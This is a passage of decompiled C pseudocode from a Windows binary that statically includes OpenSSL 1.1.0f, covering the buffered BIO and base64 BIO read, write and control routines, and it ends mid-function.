__int64 __fastcall sub_1400C5150(__int64 a1, char *a2, signed int a3)
{
  char *v4; // r14
  __int64 v7; // rbx
  unsigned int v8; // ebp
  signed int v9; // esi
  int v10; // esi
  int v11; // eax
  __int64 v12; // rbx

  v4 = a2;
  if ( !a2 )
    return 0i64;
  v7 = *(_QWORD *)(a1 + 48);
  if ( !v7 || !*(_QWORD *)(a1 + 56) )
    return 0i64;
  v8 = 0;
  sub_140029A60(a1, 15);
  while ( 1 )
  {
    v9 = *(_DWORD *)(v7 + 16);
    if ( v9 )
    {
      if ( v9 > a3 )
        v9 = a3;
      memmove(v4, (const void *)(*(_QWORD *)(v7 + 8) + *(int *)(v7 + 20)), v9);
      *(_DWORD *)(v7 + 20) += v9;
      v8 += v9;
      *(_DWORD *)(v7 + 16) -= v9;
      if ( a3 == v9 )
        return v8;
      a3 -= v9;
      v4 += v9;
    }
    if ( a3 > *(_DWORD *)v7 )
      break;
    v10 = sub_14002A2C0(*(_QWORD *)(a1 + 56), *(_QWORD *)(v7 + 8), *(_DWORD *)v7);
    if ( v10 <= 0 )
    {
      sub_140029A70(a1);
      if ( v10 < 0 )
      {
        if ( (int)v8 > 0 )
          return v8;
        return (unsigned int)v10;
      }
      return v8;
    }
    *(_DWORD *)(v7 + 20) = 0;
    *(_DWORD *)(v7 + 16) = v10;
  }
  while ( 1 )
  {
    v11 = sub_14002A2C0(*(_QWORD *)(a1 + 56), (__int64)v4, a3);
    v12 = v11;
    if ( v11 > 0 )
      goto LABEL_23;
    sub_140029A70(a1);
    if ( (int)v12 < 0 )
      break;
    if ( !(_DWORD)v12 )
      return v8;
LABEL_23:
    v8 += v12;
    if ( a3 == (_DWORD)v12 )
      return v8;
    v4 += v12;
    a3 -= v12;
  }
  if ( (int)v8 > 0 )
    LODWORD(v12) = v8;
  return (unsigned int)v12;
}
// 1400C521E: conditional instruction was optimized away because esi.4==0

//----- (00000001400C52B0) ----------------------------------------------------
__int64 __fastcall sub_1400C52B0(__int64 a1, char *a2)
{
  unsigned int v2; // r8d
  char *i; // rax

  v2 = 0;
  for ( i = a2; *i; ++v2 )
  {
    if ( v2 >= 0x80000000 )
      break;
    ++i;
  }
  return sub_1400C4F80(a1, a2, v2 & 0x7FFFFFFF);
}

//----- (00000001400C5300) ----------------------------------------------------
__int64 __fastcall sub_1400C5300(__int64 a1, _BYTE *a2, int a3)
{
  int v3; // eax
  __int64 v4; // rbx
  int v5; // ebp
  unsigned int v7; // r14d
  int v9; // r10d
  __int64 v10; // rax
  int v11; // edx
  __int64 v12; // r8
  int v14; // edi

  v4 = *(_QWORD *)(a1 + 48);
  v5 = a3 - 1;
  v7 = 0;
  sub_140029A60(a1, v3 - 17);
  while ( 1 )
  {
    while ( *(int *)(v4 + 16) > 0 )
    {
      v9 = 0;
      v10 = *(_QWORD *)(v4 + 8) + *(int *)(v4 + 20);
      v11 = 0;
      v12 = -v10;
      while ( v12 + v10 < v5 )
      {
        ++v11;
        *a2++ = *(_BYTE *)v10;
        if ( *(_BYTE *)v10 == 10 )
        {
          v9 = 1;
          break;
        }
        ++v10;
        if ( v11 >= *(_DWORD *)(v4 + 16) )
          break;
      }
      *(_DWORD *)(v4 + 16) -= v11;
      v7 += v11;
      *(_DWORD *)(v4 + 20) += v11;
      v5 -= v11;
      if ( v9 || !v5 )
      {
        *a2 = 0;
        return v7;
      }
    }
    v14 = sub_14002A2C0(*(_QWORD *)(a1 + 56), *(_QWORD *)(v4 + 8), *(_DWORD *)v4);
    if ( v14 <= 0 )
      break;
LABEL_16:
    *(_DWORD *)(v4 + 16) = v14;
    *(_DWORD *)(v4 + 20) = 0;
  }
  sub_140029A70(a1);
  *a2 = 0;
  if ( v14 >= 0 )
  {
    if ( !v14 )
      return v7;
    goto LABEL_16;
  }
  if ( (int)v7 > 0 )
    return v7;
  return (unsigned int)v14;
}
// 1400C5330: variable 'v3' is possibly undefined

//----- (00000001400C5410) ----------------------------------------------------
__int64 __fastcall sub_1400C5410(__int64 a1, unsigned int a2, int a3, _QWORD *a4)
{
  int v4; // eax
  __int64 v5; // rbx
  unsigned int v6; // edi
  size_t v7; // r14
  unsigned int v9; // r13d
  int v11; // ecx
  __int64 v12; // r8
  char *v13; // rdx
  char v14; // cl
  unsigned int v15; // eax
  _QWORD *v16; // rcx
  void *v18; // rsi
  void *v19; // rcx
  int v20; // ebp
  int v21; // r15d
  void *v22; // r12
  void *v23; // r13
  void *v24; // rcx
  void *v25; // rcx

  v5 = *(_QWORD *)(a1 + 48);
  v6 = v4 - 47;
  v7 = a3;
  v9 = a2;
  switch ( a2 )
  {
    case 1u:
      *(_QWORD *)(v5 + 16) = 0i64;
      *(_QWORD *)(v5 + 32) = 0i64;
      goto LABEL_12;
    case 3u:
      return *(unsigned int *)(v5 + 32);
    case 0xAu:
      v6 = *(_DWORD *)(v5 + 16);
      goto LABEL_11;
    case 0xBu:
      v16 = *(_QWORD **)(a1 + 56);
      if ( !v16 )
        return 0i64;
      if ( *(int *)(v5 + 32) <= 0 )
        return (unsigned int)sub_140029A90(v16, a2, v7, (__int64)a4);
      sub_140029A60(a1, 15);
      if ( *(int *)(v5 + 32) <= 0 )
        goto LABEL_47;
      break;
    case 0xCu:
      if ( !(unsigned int)sub_140029FB0(a4, 0x75u, *(_DWORD *)v5, 0)
        || !(unsigned int)sub_140029FB0(a4, 0x75u, *(_DWORD *)(v5 + 4), v6) )
      {
        return 0;
      }
      return v6;
    case 0xDu:
      v6 = *(_DWORD *)(v5 + 32);
LABEL_11:
      if ( !v6 )
        goto LABEL_12;
      return v6;
    case 0x65u:
      if ( !*(_QWORD *)(a1 + 56) )
        return 0i64;
      sub_140029A60(a1, 15);
      v6 = sub_140029A90(*(_QWORD **)(a1 + 56), v9, v7, (__int64)a4);
      sub_140029A70(a1);
      return v6;
    case 0x74u:
      v11 = *(_DWORD *)(v5 + 16);
      v6 = 0;
      if ( v11 > 0 )
      {
        v12 = (unsigned int)v11;
        v13 = (char *)(*(int *)(v5 + 20) + *(_QWORD *)(v5 + 8));
        do
        {
          v14 = *v13;
          v15 = v6 + 1;
          ++v13;
          if ( v14 != 10 )
            v15 = v6;
          v6 = v15;
          --v12;
        }
        while ( v12 );
      }
      return v6;
    case 0x75u:
      if ( a4 )
      {
        if ( *(_DWORD *)a4 )
        {
          v21 = *(_DWORD *)v5;
          v20 = a3;
          goto LABEL_26;
        }
        v20 = *(_DWORD *)(v5 + 4);
      }
      else
      {
        v20 = a3;
      }
      v21 = a3;
LABEL_26:
      v22 = *(void **)(v5 + 8);
      v23 = *(void **)(v5 + 24);
      if ( v21 > 4096 && v21 != *(_DWORD *)v5 )
      {
        v22 = sub_14001D8E0(a3);
        if ( !v22 )
          goto LABEL_34;
      }
      if ( v20 <= 4096 || v20 == *(_DWORD *)(v5 + 4) || (v23 = sub_14001D8E0(v7)) != 0i64 )
      {
        v24 = *(void **)(v5 + 8);
        if ( v24 != v22 )
        {
          sub_14001D930(v24);
          *(_QWORD *)(v5 + 8) = v22;
          *(_QWORD *)(v5 + 16) = 0i64;
          *(_DWORD *)v5 = v21;
        }
        v25 = *(void **)(v5 + 24);
        if ( v25 != v23 )
        {
          sub_14001D930(v25);
          *(_QWORD *)(v5 + 24) = v23;
          *(_QWORD *)(v5 + 32) = 0i64;
          *(_DWORD *)(v5 + 4) = v20;
        }
        return v6;
      }
      if ( v22 != *(void **)(v5 + 8) )
        sub_14001D930(v22);
LABEL_34:
      sub_140024610(32, 114, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bio\\bf_buff.c", 387);
      return 0i64;
    case 0x7Au:
      if ( a3 <= *(_DWORD *)v5 )
        goto LABEL_19;
      v18 = sub_14001D8E0(a3);
      if ( !v18 )
        goto LABEL_34;
      sub_14001D930(*(void **)(v5 + 8));
      *(_QWORD *)(v5 + 8) = v18;
LABEL_19:
      v19 = *(void **)(v5 + 8);
      *(_DWORD *)(v5 + 20) = 0;
      *(_DWORD *)(v5 + 16) = v7;
      memmove(v19, a4, v7);
      return v6;
    default:
LABEL_12:
      v16 = *(_QWORD **)(a1 + 56);
      if ( v16 )
        return (unsigned int)sub_140029A90(v16, a2, v7, (__int64)a4);
      return 0i64;
  }
  while ( 1 )
  {
    v6 = sub_14002A430(*(_QWORD *)(a1 + 56), *(_QWORD *)(v5 + 24) + *(int *)(v5 + 36), *(_DWORD *)(v5 + 32));
    sub_140029A70(a1);
    if ( (int)v6 <= 0 )
      break;
    *(_DWORD *)(v5 + 36) += v6;
    *(_DWORD *)(v5 + 32) -= v6;
    sub_140029A60(a1, 15);
    if ( *(int *)(v5 + 32) <= 0 )
    {
LABEL_47:
      a2 = v9;
      *(_QWORD *)(v5 + 32) = 0i64;
      v16 = *(_QWORD **)(a1 + 56);
      return (unsigned int)sub_140029A90(v16, a2, v7, (__int64)a4);
    }
  }
  return v6;
}
// 1400C5439: variable 'v4' is possibly undefined

//----- (00000001400C5810) ----------------------------------------------------
__int64 __fastcall sub_1400C5810(__int64 a1)
{
  int v1; // eax
  _DWORD *v3; // rax
  _DWORD *v4; // rbx
  void *v5; // rax
  __int64 result; // rax
  void *v7; // rax

  v3 = sub_14001DC20((unsigned int)(v1 + 8));
  v4 = v3;
  if ( !v3 )
    return 0i64;
  *v3 = 4096;
  v5 = sub_14001D8E0(0x1000ui64);
  *((_QWORD *)v4 + 1) = v5;
  if ( !v5 )
  {
    sub_14001D930(v4);
    return 0i64;
  }
  v4[1] = 4096;
  v7 = sub_14001D8E0(0x1000ui64);
  *((_QWORD *)v4 + 3) = v7;
  if ( v7 )
  {
    *(_QWORD *)(a1 + 48) = v4;
    result = 1i64;
    *(_DWORD *)(a1 + 24) = 1;
    *(_DWORD *)(a1 + 32) = 0;
  }
  else
  {
    sub_14001D930(*((void **)v4 + 1));
    sub_14001D930(v4);
    return 0i64;
  }
  return result;
}
// 1400C582A: variable 'v1' is possibly undefined

//----- (00000001400C5900) ----------------------------------------------------
__int64 __fastcall sub_1400C5900(__int64 a1)
{
  __int64 v3; // rbx

  if ( !a1 )
    return 0i64;
  v3 = *(_QWORD *)(a1 + 48);
  sub_14001D930(*(void **)(v3 + 8));
  sub_14001D930(*(void **)(v3 + 24));
  sub_14001D930(*(void **)(a1 + 48));
  *(_QWORD *)(a1 + 48) = 0i64;
  *(_DWORD *)(a1 + 24) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  return 1i64;
}

//----- (00000001400C5990) ----------------------------------------------------
__int64 __fastcall sub_1400C5990(__int64 a1, unsigned int a2, __int64 a3)
{
  _QWORD *v3; // rcx

  v3 = *(_QWORD **)(a1 + 56);
  if ( v3 )
    return sub_140029970(v3, a2, a3);
  else
    return 0i64;
}

//----- (00000001400C59C0) ----------------------------------------------------
__int64 __fastcall sub_1400C59C0(__int64 a1, char *a2, int a3)
{
  unsigned int v4; // ebp
  __int64 v7; // rbx
  __int64 v8; // rax
  __int64 v9; // r15
  _DWORD *v10; // rcx
  signed int i; // edi
  int v12; // eax
  unsigned int v13; // esi
  int v14; // edi
  int v15; // eax
  int v16; // r8d
  int v17; // eax
  int v19; // eax
  __int64 v20; // r8
  signed int v21; // esi
  int v22; // eax
  unsigned int v23; // edi

  v4 = 0;
  v7 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v8 = sub_14002A130(a1);
  v9 = v8;
  if ( !v7 || !v8 )
    return 0i64;
  sub_140029A60(a1, 15);
  if ( *(_DWORD *)(v7 + 16) != 1 )
  {
    v10 = *(_DWORD **)(v7 + 32);
    *(_DWORD *)(v7 + 16) = 1;
    *(_QWORD *)v7 = 0i64;
    *(_DWORD *)(v7 + 8) = 0;
    sub_1400BA180(v10);
  }
  if ( *(int *)(v7 + 4) >= 1502 )
    sub_1400234A0(
      "assertion failed: ctx->buf_off < (int)sizeof(ctx->buf)",
      "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
      340i64);
  if ( *(int *)v7 > 1502 )
    sub_1400234A0(
      "assertion failed: ctx->buf_len <= (int)sizeof(ctx->buf)",
      "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
      341i64);
  if ( *(_DWORD *)v7 < *(_DWORD *)(v7 + 4) )
    sub_1400234A0(
      "assertion failed: ctx->buf_len >= ctx->buf_off",
      "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
      342i64);
  for ( i = *(_DWORD *)v7 - *(_DWORD *)(v7 + 4); i > 0; i -= v12 )
  {
    v12 = sub_14002A430(v9, v7 + *(int *)(v7 + 4) + 40i64, i);
    v13 = v12;
    if ( v12 <= 0 )
    {
      sub_140029A70(a1);
      return v13;
    }
    if ( v12 > i )
      sub_1400234A0("assertion failed: i <= n", "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c", 350i64);
    *(_DWORD *)(v7 + 4) += v12;
    if ( *(int *)(v7 + 4) > 1502 )
      sub_1400234A0(
        "assertion failed: ctx->buf_off <= (int)sizeof(ctx->buf)",
        "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
        352i64);
    if ( *(_DWORD *)v7 < *(_DWORD *)(v7 + 4) )
      sub_1400234A0(
        "assertion failed: ctx->buf_len >= ctx->buf_off",
        "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
        353i64);
  }
  *(_QWORD *)v7 = 0i64;
  if ( !a2 || a3 <= 0 )
    return 0i64;
  while ( 1 )
  {
    v14 = a3;
    if ( a3 > 1024 )
      v14 = 1024;
    if ( (sub_14002A420(a1, 0xFFFFFFFF) & 0x100) == 0 )
    {
      if ( !(unsigned int)sub_1400BA190(*(int **)(v7 + 32), (_BYTE *)(v7 + 40), (_DWORD *)v7, a2, v14) )
      {
        if ( !v4 )
          return (unsigned int)-1;
        return v4;
      }
      if ( *(int *)v7 > 1502 )
        sub_1400234A0(
          "assertion failed: ctx->buf_len <= (int)sizeof(ctx->buf)",
          "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
          410i64);
      if ( *(_DWORD *)v7 < *(_DWORD *)(v7 + 4) )
      {
        v20 = 411i64;
LABEL_47:
        sub_1400234A0(
          "assertion failed: ctx->buf_len >= ctx->buf_off",
          "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
          v20);
      }
      goto LABEL_48;
    }
    v15 = *(_DWORD *)(v7 + 8);
    if ( v15 <= 0 )
    {
      if ( v14 < 3 )
      {
        memmove((void *)(v7 + 1542), a2, v14);
        v4 += v14;
        *(_DWORD *)(v7 + 8) = v14;
        return v4;
      }
      v14 = 3 * (v14 / 3);
      v19 = sub_1400BA000((_BYTE *)(v7 + 40), (__int64)a2, v14);
      *(_DWORD *)v7 = v19;
      if ( v19 > 1502 )
        sub_1400234A0(
          "assertion failed: ctx->buf_len <= (int)sizeof(ctx->buf)",
          "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
          401i64);
      if ( *(_DWORD *)v7 < *(_DWORD *)(v7 + 4) )
      {
        v20 = 402i64;
        goto LABEL_47;
      }
LABEL_48:
      v4 += v14;
      goto LABEL_49;
    }
    if ( v15 > 3 )
      sub_1400234A0("assertion failed: ctx->tmp_len <= 3", "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c", 368i64);
    v14 = 3 - *(_DWORD *)(v7 + 8);
    if ( v14 > a3 )
      v14 = a3;
    memmove((void *)(v7 + *(int *)(v7 + 8) + 1542i64), a2, v14);
    *(_DWORD *)(v7 + 8) += v14;
    v4 += v14;
    v16 = *(_DWORD *)(v7 + 8);
    if ( v16 < 3 )
      return v4;
    v17 = sub_1400BA000((_BYTE *)(v7 + 40), v7 + 1542, v16);
    *(_DWORD *)v7 = v17;
    if ( v17 > 1502 )
      sub_1400234A0(
        "assertion failed: ctx->buf_len <= (int)sizeof(ctx->buf)",
        "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
        383i64);
    if ( *(_DWORD *)v7 < *(_DWORD *)(v7 + 4) )
      sub_1400234A0(
        "assertion failed: ctx->buf_len >= ctx->buf_off",
        "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
        384i64);
    *(_DWORD *)(v7 + 8) = 0;
LABEL_49:
    a3 -= v14;
    a2 += v14;
    *(_DWORD *)(v7 + 4) = 0;
    v21 = *(_DWORD *)v7;
    if ( *(int *)v7 > 0 )
      break;
LABEL_58:
    *(_QWORD *)v7 = 0i64;
    if ( a3 <= 0 )
      return v4;
  }
  while ( 1 )
  {
    v22 = sub_14002A430(v9, v7 + *(int *)(v7 + 4) + 40i64, v21);
    v23 = v22;
    if ( v22 <= 0 )
      break;
    if ( v22 > v21 )
      sub_1400234A0("assertion failed: i <= n", "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c", 425i64);
    *(_DWORD *)(v7 + 4) += v22;
    v21 -= v22;
    if ( *(int *)(v7 + 4) > 1502 )
      sub_1400234A0(
        "assertion failed: ctx->buf_off <= (int)sizeof(ctx->buf)",
        "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
        428i64);
    if ( *(_DWORD *)v7 < *(_DWORD *)(v7 + 4) )
      sub_1400234A0(
        "assertion failed: ctx->buf_len >= ctx->buf_off",
        "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
        429i64);
    if ( v21 <= 0 )
      goto LABEL_58;
  }
  sub_140029A70(a1);
  if ( !v4 )
    return v23;
  return v4;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400C5E20) ----------------------------------------------------
__int64 __fastcall sub_1400C5E20(__int64 a1, char *a2, int a3)
{
  int v3; // r15d
  __int64 v6; // rsi
  int v7; // r13d
  __int64 v9; // rbx
  __int64 v10; // rax
  __int64 v11; // r14
  _QWORD *v12; // rcx
  unsigned int v13; // edi
  int v14; // eax
  int v15; // ebp
  unsigned __int8 *v16; // r14
  unsigned __int8 *v17; // rsi
  unsigned __int8 *v18; // rdi
  char v19; // al
  __int64 v20; // rdx
  _BYTE *v21; // rcx
  int v22; // edi
  __int64 v23; // rcx
  unsigned __int8 *v24; // rsi
  signed int v25; // esi
  int v26; // edi
  int v27; // ebp
  int v28; // eax
  int v29; // edi
  int v30; // [rsp+30h] [rbp-48h] BYREF
  __int64 v31; // [rsp+38h] [rbp-40h]
  char *v33; // [rsp+88h] [rbp+10h]
  int v34; // [rsp+98h] [rbp+20h]

  v33 = a2;
  v3 = 0;
  v6 = a1;
  v7 = 0;
  if ( !a2 )
    return 0i64;
  v9 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v10 = sub_14002A130(v6);
  v31 = v10;
  v11 = v10;
  if ( !v9 || !v10 )
    return 0i64;
  sub_140029A60(v6, 15);
  if ( *(_DWORD *)(v9 + 16) != 2 )
  {
    v12 = *(_QWORD **)(v9 + 32);
    *(_DWORD *)(v9 + 16) = 2;
    *(_QWORD *)v9 = 0i64;
    *(_DWORD *)(v9 + 8) = 0;
    sub_1400B9DC0(v12);
  }
  if ( *(int *)v9 > 0 )
  {
    if ( *(_DWORD *)v9 < *(_DWORD *)(v9 + 4) )
      sub_1400234A0(
        "assertion failed: ctx->buf_len >= ctx->buf_off",
        "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
        134i64);
    v7 = *(_DWORD *)v9 - *(_DWORD *)(v9 + 4);
    if ( v7 > a3 )
      v7 = a3;
    if ( v7 + *(_DWORD *)(v9 + 4) >= 1502 )
      sub_1400234A0(
        "assertion failed: ctx->buf_off + i < (int)sizeof(ctx->buf)",
        "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
        138i64);
    memmove(a2, (const void *)(v9 + *(int *)(v9 + 4) + 40i64), v7);
    *(_DWORD *)(v9 + 4) += v7;
    a3 -= v7;
    v33 = &a2[v7];
    if ( *(_DWORD *)v9 == *(_DWORD *)(v9 + 4) )
      *(_QWORD *)v9 = 0i64;
  }
  v34 = 0;
  v13 = 0;
  if ( a3 <= 0 )
    goto LABEL_56;
LABEL_17:
  if ( *(int *)(v9 + 24) <= 0 )
    goto LABEL_55;
  v14 = sub_14002A2C0(v11, v9 + *(int *)(v9 + 8) + 1542i64, 1024 - *(_DWORD *)(v9 + 8));
  v13 = v14;
  if ( v14 <= 0 )
  {
    v34 = v14;
    if ( (unsigned int)sub_14002A420(v11, 8u) )
      goto LABEL_56;
    *(_DWORD *)(v9 + 24) = v13;
    if ( !*(_DWORD *)(v9 + 8) )
      goto LABEL_56;
    v13 = 0;
  }
  *(_DWORD *)(v9 + 8) += v13;
  v15 = *(_DWORD *)(v9 + 8);
  if ( *(_DWORD *)(v9 + 20) )
  {
    if ( (sub_14002A420(v6, 0xFFFFFFFF) & 0x100) != 0 )
    {
      *(_DWORD *)(v9 + 8) = 0;
      goto LABEL_62;
    }
    if ( !*(_DWORD *)(v9 + 20) )
      goto LABEL_60;
    v30 = 0;
    v16 = (unsigned __int8 *)(v9 + 1542);
    v17 = (unsigned __int8 *)(v9 + 1542);
    v18 = (unsigned __int8 *)(v9 + 1542);
    if ( v15 <= 0 )
      goto LABEL_42;
    while ( 1 )
    {
      v19 = *v18++;
      if ( v19 == 10 )
      {
        if ( *(_DWORD *)(v9 + 12) )
        {
          *(_DWORD *)(v9 + 12) = 0;
        }
        else
        {
          if ( (int)sub_1400B9DD0(*(int **)(v9 + 32), (_BYTE *)(v9 + 40), &v30, v17, (int)v18 - (int)v17) > 0
            || v30
            || !*(_DWORD *)(v9 + 20) )
          {
            if ( v17 != v16 )
            {
              v15 += v9 - (_DWORD)v17 + 1542;
              v20 = v15;
              if ( v15 > 0 )
              {
                v21 = (_BYTE *)(v9 + 1542);
                do
                {
                  *v21 = v17[(_QWORD)v21 - v9 - 1542];
                  ++v21;
                  --v20;
                }
                while ( v20 );
              }
            }
            sub_1400B9DC0(*(_QWORD **)(v9 + 32));
            *(_DWORD *)(v9 + 20) = 0;
LABEL_42:
            if ( v3 != v15 || v30 )
            {
              v6 = a1;
              v3 = 0;
              *(_DWORD *)(v9 + 8) = 0;
              goto LABEL_62;
            }
            if ( v17 != v16 )
            {
              if ( v17 != v18 )
              {
                v22 = (_DWORD)v18 - (_DWORD)v17;
                v23 = v22;
                if ( v22 > 0 )
                {
                  v24 = &v17[-v9];
                  do
                  {
                    *v16 = v24[(_QWORD)v16 - 1542];
                    ++v16;
                    --v23;
                  }
                  while ( v23 );
                }
                *(_DWORD *)(v9 + 8) = v22;
              }
              v3 = 0;
              goto LABEL_53;
            }
            v6 = a1;
            v3 = 0;
            v11 = v31;
            if ( v15 == 1024 )
            {
              *(_DWORD *)(v9 + 12) = 1;
              *(_DWORD *)(v9 + 8) = 0;
            }
LABEL_54:
            if ( a3 <= 0 )
            {
LABEL_55:
              v13 = v34;
              goto LABEL_56;
            }
            goto LABEL_17;
          }
          sub_1400B9DC0(*(_QWORD **)(v9 + 32));
        }
        v17 = v18;
      }
      if ( ++v3 >= v15 )
        goto LABEL_42;
    }
  }
LABEL_60:
  if ( v15 < 1024 && *(int *)(v9 + 24) > 0 )
    goto LABEL_54;
LABEL_62:
  if ( (sub_14002A420(v6, 0xFFFFFFFF) & 0x100) != 0 )
  {
    v25 = v15 & 0xFFFFFFFC;
    v26 = sub_1400B9BD0((_BYTE *)(v9 + 40), (char *)(v9 + 1542), v15 & 0xFFFFFFFC);
    if ( (int)(v15 & 0xFFFFFFFC) > 2 && *(_BYTE *)(v25 - 1 + v9 + 1542) == 61 )
    {
      --v26;
      if ( *(_BYTE *)(v25 - 2 + v9 + 1542) == 61 )
        --v26;
    }
    if ( v25 != v15 )
    {
      v27 = v15 - v25;
      memmove((void *)(v9 + 1542), (const void *)(v25 + v9 + 1542), v27);
      *(_DWORD *)(v9 + 8) = v27;
    }
    v6 = a1;
    v3 = 0;
    v28 = 0;
    if ( v26 > 0 )
      v28 = v26;
    *(_DWORD *)v9 = v28;
  }
  else
  {
    v26 = sub_1400B9DD0(*(int **)(v9 + 32), (_BYTE *)(v9 + 40), (_DWORD *)v9, (unsigned __int8 *)(v9 + 1542), v15);
    *(_DWORD *)(v9 + 8) = 0;
  }
  *(_DWORD *)(v9 + 4) = 0;
  if ( v26 >= 0 )
  {
    v29 = a3;
    if ( *(_DWORD *)v9 <= a3 )
      v29 = *(_DWORD *)v9;
    memmove(v33, (const void *)(v9 + 40), v29);
    v7 += v29;
    *(_DWORD *)(v9 + 4) = v29;
    if ( v29 == *(_DWORD *)v9 )
      *(_QWORD *)v9 = 0i64;
    a3 -= v29;
    v33 += v29;
LABEL_53:
    v6 = a1;
    v11 = v31;
    goto LABEL_54;
  }
  v13 = 0;
  *(_DWORD *)v9 = 0;
LABEL_56:
  sub_140029A70(v6);
  if ( !v7 )
    return v13;
  return (unsigned int)v7;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400C62C0) ----------------------------------------------------
__int64 __fastcall sub_1400C62C0(__int64 a1, char *a2)
{
  unsigned int v2; // r8d
  char *i; // rax

  v2 = 0;
  for ( i = a2; *i; ++v2 )
  {
    if ( v2 >= 0x80000000 )
      break;
    ++i;
  }
  return sub_1400C59C0(a1, a2, v2 & 0x7FFFFFFF);
}

//----- (00000001400C6310) ----------------------------------------------------
__int64 __fastcall sub_1400C6310(__int64 a1, unsigned int a2, unsigned int a3, __int64 a4)
{
  int v4; // eax
  unsigned int v6; // edi
  __int64 v10; // rbx
  __int64 v11; // rax
  _QWORD *v12; // rbp
  __int64 result; // rax
  int v14; // r8d
  int *v15; // rcx
  unsigned int v16; // edi

  v6 = v4 - 31;
  v10 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v11 = sub_14002A130(a1);
  v12 = (_QWORD *)v11;
  if ( !v10 || !v11 )
    return 0i64;
  switch ( a2 )
  {
    case 1u:
      *(_DWORD *)(v10 + 24) = v6;
      *(_DWORD *)(v10 + 20) = v6;
      *(_DWORD *)(v10 + 16) = 0;
      return (unsigned int)sub_140029A90(v12, a2, a3, a4);
    case 2u:
      if ( *(int *)(v10 + 24) > 0 )
        return (unsigned int)sub_140029A90(v12, a2, a3, a4);
      return v6;
    case 0xAu:
      if ( *(_DWORD *)v10 < *(_DWORD *)(v10 + 4) )
        sub_1400234A0(
          "assertion failed: ctx->buf_len >= ctx->buf_off",
          "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
          472i64);
      v6 = *(_DWORD *)v10 - *(_DWORD *)(v10 + 4);
      goto LABEL_18;
    case 0xBu:
LABEL_20:
      if ( *(_DWORD *)v10 == *(_DWORD *)(v10 + 4) )
        goto LABEL_23;
      break;
    case 0xCu:
      return v6;
    case 0xDu:
      if ( *(_DWORD *)v10 < *(_DWORD *)(v10 + 4) )
        sub_1400234A0(
          "assertion failed: ctx->buf_len >= ctx->buf_off",
          "..\\..\\openssl-1.1.0f\\crypto\\evp\\bio_b64.c",
          463i64);
      v6 = *(_DWORD *)v10 - *(_DWORD *)(v10 + 4);
      if ( *(_DWORD *)v10 == *(_DWORD *)(v10 + 4) )
      {
        if ( *(_DWORD *)(v10 + 16) != v6 && (unsigned int)sub_14001D4F0(*(unsigned int **)(v10 + 32)) )
          return 1i64;
      }
      else
      {
LABEL_18:
        if ( (int)v6 > 0 )
          return v6;
      }
      return (unsigned int)sub_140029A90(v12, a2, a3, a4);
    case 0x65u:
      sub_140029A60(a1, 15);
      v16 = sub_140029A90(v12, a2, a3, a4);
      sub_140029A70(a1);
      return v16;
    default:
      return (unsigned int)sub_140029A90(v12, a2, a3, a4);
  }
  while ( 1 )
  {
    result = sub_1400C59C0(a1, 0i64, 0);
    if ( (int)result < 0 )
      return result;
    if ( *(_DWORD *)v10 == *(_DWORD *)(v10 + 4) )
    {
LABEL_23:
      if ( (sub_14002A420(a1, 0xFFFFFFFF) & 0x100) != 0 )
      {
        v14 = *(_DWORD *)(v10 + 8);
        if ( v14 )
        {
          *(_DWORD *)v10 = sub_1400BA000((_BYTE *)(v10 + 40), v10 + 1542, v14);
          *(_QWORD *)(v10 + 4) = 0i64;
          goto LABEL_20;
        }
      }
      else if ( *(_DWORD *)(v10 + 16) && (unsigned int)sub_14001D4F0(*(unsigned int **)(v10 + 32)) )
      {
        v15 = *(int **)(v10 + 32);
        *(_DWORD *)(v10 + 4) = 0;
        sub_1400BA100(v15, (_BYTE *)(v10 + 40), (unsigned int *)v10);
        goto LABEL_20;
      }
      return (unsigned int)sub_140029A90(v12, a2, a3, a4);
    }
  }
}
// 1400C633A: variable 'v4' is possibly undefined
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400C65A0) ----------------------------------------------------
__int64 __fastcall sub_1400C65A0(__int64 a1)
{
  _QWORD *v2; // rax
  _QWORD *v3; // rbx
  void *v4; // rax

  v2 = sub_14001DC20(0xA08ui64);
  v3 = v2;
  if ( !v2 )
    return 0i64;
  *((_DWORD *)v2 + 6) = 1;
  *((_DWORD *)v2 + 5) = 1;
  v4 = sub_1400B9FD0();
  v3[4] = v4;
  if ( !v4 )
  {
    sub_14001D930(v3);
    return 0i64;
  }
  sub_14002A3F0(a1, (__int64)v3);
  sub_14002A410(a1, 1);
  return 1i64;
}

//----- (00000001400C6640) ----------------------------------------------------
__int64 __fastcall sub_1400C6640(__int64 a1)
{
  __int64 result; // rax
  void *v3; // rdi

  if ( !a1 )
    return 0i64;
